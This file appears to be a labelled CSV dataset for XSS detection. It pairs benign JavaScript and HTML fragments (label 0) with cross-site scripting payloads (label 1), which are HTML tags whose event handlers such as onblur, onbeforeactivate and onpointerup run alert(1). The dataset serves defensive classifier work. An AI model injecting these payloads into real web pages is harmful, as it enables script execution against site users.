payload,label
"<address onbeforepaste=""alert(1)"" contenteditable>test</address>",1
<br onblur=alert(1) tabindex=1 id=x></br><input autofocus>,1
"</span> <span class=""reference-text""><cite class=""citation news"">metz, cade (15 march 2018). <a rel=""nofollow"" class=""external text"" href=""https://www.nytimes.com/2018/03/15/technology/military-artificial-intelligence.html"">""pentagon wants silicon valley's help on a.i."" </a> <i>the new york times </i><span class=""reference-accessdate"">. retrieved <span class=""nowrap"">19 march",0
<strong onpointerup=alert(1)>xss</strong>,1
"<embed onmousemove=""alert(1)"">test</embed>",1
<fieldset onpointerout=alert(1)>xss</fieldset>,1
"this._queuecallback(() => this._destroyelement(), this._element, isanimated)",0
if (index > items.length - 1 || index < 0) { return },0
body: 'chips can be used to represent small blocks of information. they are most commonly used either for contacts or for tags.',0
"document.queryselectorall('.bd-example .toast') .foreach(toastnode => { const toast = new bootstrap.toast(toastnode, {",0
_move(event) { this._deltax = event.touches && event.touches.length > 1 ? 0 :,0
} if (currchips.chipsdata.length) { currchips.selectchip(selectindex);,0
delete node.dataset[key],0
"<small oncut=""alert(1)"" contenteditable>test</small>",1
if ( lookbackward && handlenumber > 0 ) {,0
"<canvas onmousedown=""alert(1)"">test</canvas>",1
<video id=x tabindex=1 onbeforeactivate=alert(1)></video>,1
"<track draggable=""true"" ondragenter=""alert(1)"">test</track>",1
"href: 'http://materializecss.com/pickers.html', title: 'date time picker', body: 'pickers provide a simple way to select a date or time.'",0
<noframes onblur=alert(1) tabindex=1 id=x></noframes><input autofocus>,1
"<plaintext oncopy=""alert(1)"" contenteditable>test</plaintext>",1
const isdisabled = element => { if (!element || element.nodetype !== node.element_node) { return true,0
g.children[a].reset(),0
<slot id=x tabindex=1 onbeforeactivate=alert(1)></slot>,1
"if ( mode === 'count' ) { var spread = ( 100 / (values-1) ), v, i = 0; values = [];",0
<select id=x tabindex=1 onbeforeactivate=alert(1)></select>,1
value: function destroy() { this._removeeventhandlers(); this.el.m_carousel = undefined;,0
return domelem.m_scrollspy,0
"<button ondblclick=""alert(1)"">test</button>",1
const escape_key$1 = 'escape',0
"let root = !!context ? context : document.body; let registry = { autocomplete: root.queryselectorall('.autocomplete:not(.no-autoinit)'),",0
"<li class=""toclevel-2 tocsection-65""><a href=""#superintelligence""><span class=""tocnumber"">8.5",0
"</div> </td> </tr><tr><td class=""navbox-abovebelow"" colspan=""2"">",0
this._animateindicator(previndex); e.preventdefault(); },0
